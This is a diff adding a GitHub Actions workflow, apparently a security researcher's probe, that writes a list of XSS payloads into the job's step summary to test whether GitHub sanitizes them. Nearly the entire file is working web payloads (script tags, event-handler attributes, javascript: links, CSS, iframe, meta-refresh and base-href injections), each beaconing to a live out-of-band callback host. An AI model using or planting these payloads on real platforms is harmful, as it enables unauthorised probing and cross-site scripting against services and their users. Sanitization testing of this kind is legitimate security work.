@@ -1,0 +1,45 @@
+name: Step Summary Sanitization Test
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  xss-test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Write HTML payloads
+        run: |
+          cat >> $GITHUB_STEP_SUMMARY << 'ENDPAYLOAD'
+          ## XSS Test Payloads
+          
+          <script>fetch("https://d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live/xss-step-summary")</script>
+          
+          <img src=x onerror="fetch('https://d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live/img-onerror')">
+          
+          <svg onload="fetch('https://d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live/svg-onload')"></svg>
+          
+          <style>body{background-image:url(https://d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live/css-bg)}</style>
+          
+          <link rel=stylesheet href="https://d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live/css-link">
+          
+          <form action="https://d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live/form"><input name=q value=test><input type=submit></form>
+          
+          <iframe src="https://d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live/iframe"></iframe>
+          
+          <meta http-equiv="refresh" content="0;url=https://d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live/meta-refresh">
+          
+          <base href="https://d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live/">
+          
+          <a href="javascript:fetch('https://d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live/js-href')">Click</a>
+          
+          <details open ontoggle="fetch('https://d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live/details-toggle')"><summary>X</summary></details>
+          
+          <marquee onstart="fetch('https://d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live/marquee')">X</marquee>
+          
+          <object data="https://d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live/object"></object>
+          
+          <embed src="https://d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live/embed">
+          
+          <input onfocus="fetch('https://d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live/input-focus')" autofocus>
+          
+          CANARY_STEP_SUMMARY_XSS_TEST_COMPLETE
+          ENDPAYLOAD
